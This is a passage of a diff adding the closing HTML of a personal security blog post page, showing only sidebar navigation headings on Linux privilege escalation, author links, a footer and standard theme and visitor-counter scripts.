nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suid%E6%8F%90%E6%9D%83"><span class="nav-text">suid提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="nav-text">写入文件提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
